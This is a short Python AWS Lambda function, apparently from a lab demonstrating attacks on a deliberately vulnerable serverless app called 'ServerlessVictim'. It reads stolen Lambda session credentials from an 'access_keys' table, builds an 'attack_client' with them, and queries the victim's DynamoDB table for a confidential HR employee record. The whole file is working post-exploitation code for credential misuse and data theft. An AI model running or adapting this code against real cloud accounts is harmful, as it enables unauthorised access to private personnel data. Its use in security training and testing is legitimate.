import boto3
from boto3.dynamodb.conditions import Key

dynamodb = boto3.resource('dynamodb')
table = dynamodb.Table('access_keys')

def main(event, context):

    function_name = event.get('function_name', 'query_location')

    response = table.query(
        KeyConditionExpression= Key("AWS_LAMBDA_FUNCTION_NAME").eq(f"ServerlessVictim-dev-{function_name}")
    )

    attack_client = boto3.client(
        'dynamodb',
        aws_access_key_id=response['Items'][0]['AWS_ACCESS_KEY_ID'],
        aws_secret_access_key=response['Items'][0]['AWS_SECRET_ACCESS_KEY'],
        aws_session_token=response['Items'][0]['AWS_SESSION_TOKEN']
    )

    # Change the key
    employee_id = 'HRCONF#HR-EMPLOYEE1'

    response = attack_client.query(
        TableName=response['Items'][0]['db_name'],
        IndexName="GSI-1",
        Select='ALL_ATTRIBUTES',
        KeyConditionExpression="sk = :employeeID",
        ExpressionAttributeValues={":employeeID": {"S": employee_id}}
    )

    return response['Items']